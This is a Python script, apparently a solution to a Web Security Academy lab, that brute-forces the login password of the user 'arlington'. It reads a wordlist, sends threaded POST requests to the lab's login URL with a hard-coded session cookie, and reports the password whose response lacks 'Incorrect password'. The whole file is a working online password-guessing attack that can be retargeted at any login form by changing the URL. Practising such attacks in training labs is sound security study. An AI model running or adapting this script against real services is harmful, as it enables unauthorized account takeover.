import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()
    with open(filename) as file:
        for line in file:
            listPassword.append(line.strip())
    
    return listPassword

def fetch_send_request(url, cookie, password):
    loginData = {
        "username": "arlington",
        "password": password
    }
    loginResponse = requests.post(url, cookies=cookie, data=loginData)
    if "Incorrect password" not in loginResponse.text:
        print(f"[+] Found Password User arlington: {password}")

def main():
    url = "https://0a00007d038685c080e1e95c00d50037.web-security-academy.net/login"
    cookie = {"session": "RPWFpOinGRvubwz1EhP0v3X5YWsY2yjH"}
    passwordFilename = "./password.txt"
    listPassword = fetchPassword(passwordFilename)
    for password in listPassword:
        thread = Thread(target=fetch_send_request, args=(url, cookie, password))
        thread.start()
        sleep(0.2)
if __name__ == "__main__":
    main()